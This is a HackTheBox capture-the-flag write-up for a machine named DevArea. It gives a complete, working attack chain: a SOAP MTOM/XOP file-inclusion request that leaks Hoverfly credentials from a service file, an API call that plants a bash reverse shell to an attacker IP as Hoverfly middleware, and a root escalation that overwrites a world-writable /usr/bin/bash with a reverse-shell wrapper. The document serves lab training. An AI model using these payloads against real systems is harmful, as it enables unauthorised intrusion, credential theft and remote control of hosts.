🌐 [English](README.md) | [Français](README.fr.md) | [日本語](README.ja.md)

# DevArea — HackTheBox Writeup

<div style="display: flex; align-items: center; gap: 20px;">
<img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/88d6d295a9624c91cbdae1e0215cb354.png" width="120"/>
<div>

**Difficulty**: Medium  
**OS**: Linux  
**Type**: Web / Middleware  

</div>
</div>

---

## Attack Chain Summary

```
LFI via XOP/MTOM (SOAP) → /etc/systemd/system/hoverfly.service
→ Hoverfly credentials → JWT token
→ RCE via middleware (bash reverse shell)
→ world-writable /usr/bin/bash + sudo syswatch.sh → ROOT
```

---

## Enumeration

### Nmap Scan

```bash
nmap -sV -sC 10.129.x.x -oN scan.txt
```

Open ports:
- **8080** — Employee SOAP web service (`/employeeservice`)
- **8888** — Hoverfly proxy/admin API

### Service Discovery

The SOAP service on port 8080 exposes a `submitReport` endpoint.  
The Hoverfly admin panel on port 8888 exposes `/api/token-auth` and `/api/v2/hoverfly/middleware`.

---

## Foothold — LFI via XOP/MTOM

### Vulnerability

The `submitReport` SOAP endpoint accepts MTOM (Message Transmission Optimization Mechanism) requests. The `<content>` field supports `<xop:Include>` references — which can point to **local files** via the `file://` scheme, resulting in an **unauthenticated LFI**.

### Request Template

```
--MIMEBoundary
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-Transfer-Encoding: 8bit
Content-ID: <root@example.com>

<?xml version="1.0"?>
<soap:Envelope xmlns:soap="..." xmlns:tns="http://devarea.htb/">
<soap:Body><tns:submitReport><arg0>
  <confidential>false</confidential>
  <content>
    <xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include"
      href="file:///etc/systemd/system/hoverfly.service"/>
  </content>
  <department>x</department>
  <employeeName>x</employeeName>
</arg0></tns:submitReport></soap:Body>
</soap:Envelope>
--MIMEBoundary--
```

The response contains the file content base64-encoded inside `<return>`.

### Extracting Hoverfly Credentials

```bash
curl -s -X POST http://10.129.x.x:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="MIMEBoundary"; start="<root@example.com>"; start-info="text/xml"' \
  --data-binary @lfi_payload.txt
```

The service file contains a line like:
```
ExecStart=/usr/bin/hoverfly -webserver -pp 8080 -ap 8888 \
  -username admin -password <REDACTED>
```

We extract the plaintext password from the `-password` flag.

---

## User Shell — RCE via Hoverfly Middleware

### Authentication to Hoverfly

```bash
curl -s -X POST http://10.129.x.x:8888/api/token-auth \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"<PASSWORD>"}'
```

We receive a JWT token.

### Middleware RCE

Hoverfly's middleware feature allows specifying a binary + script to execute on each proxied request. By configuring `/bin/bash` as the binary and a reverse shell one-liner as the script, we trigger arbitrary command execution:

```bash
curl -s -X PUT http://10.129.x.x:8888/api/v2/hoverfly/middleware \
  -H 'Authorization: Bearer <JWT>' \
  -H 'Content-Type: application/json' \
  -d '{
    "binary": "/bin/bash",
    "script": "bash -i >& /dev/tcp/10.10.x.x/4444 0>&1 &"
  }'
```

### Listener

```bash
nc -lvnp 4444
```

We receive a shell as the service user.

---

## User Flag

```bash
cat ~/user.txt
```

---

## Privilege Escalation

### Enumeration

```bash
find / -writable -type f 2>/dev/null | grep -v proc
sudo -l
```

Key findings:
- `/usr/bin/bash` is **world-writable**
- The user can run `sudo /opt/syswatch/syswatch.sh` without password

### Attack Plan

Since `/usr/bin/bash` is world-writable, we can replace it with a malicious wrapper that triggers a root reverse shell before restoring the original binary. When `sudo /opt/syswatch/syswatch.sh` executes (it calls `/usr/bin/bash` internally), our payload fires as root.

### Steps

**1. Back up the original bash:**

```bash
cp /bin/bash /tmp/bash.bak
```

**2. Write the malicious `/usr/bin/bash`:**

```python
python3 -c "
import binascii
evil = (
    b'#!/tmp/bash.bak\n'
    b'bash -i >& /dev/tcp/10.10.x.x/4445 0>&1 &\n'
    b'cp /tmp/bash.bak /usr/bin/bash\n'
    b'exec /tmp/bash.bak \"\$@\"\n'
)
open('/tmp/evil_bash','wb').write(evil)
"
chmod +x /tmp/evil_bash
```

> We write to `/tmp` first to avoid `ETXTBSY` (text file busy) errors, then copy to `/usr/bin/bash`.

**3. Set up the root listener:**

```bash
nc -lvnp 4445
```

**4. Trigger the chain:**

```bash
/bin/dash -c '
  killall -9 bash;
  sleep 2;
  cp /tmp/evil_bash /usr/bin/bash;
  sudo /opt/syswatch/syswatch.sh --version
' &
```

> We use `/bin/dash` instead of bash to avoid killing our own session.  
> `killall -9 bash` releases the kernel lock on `/usr/bin/bash` so we can overwrite it.

### Root Shell

We receive a shell as `root`.

---

## Root Flag

```bash
cat /root/root.txt
```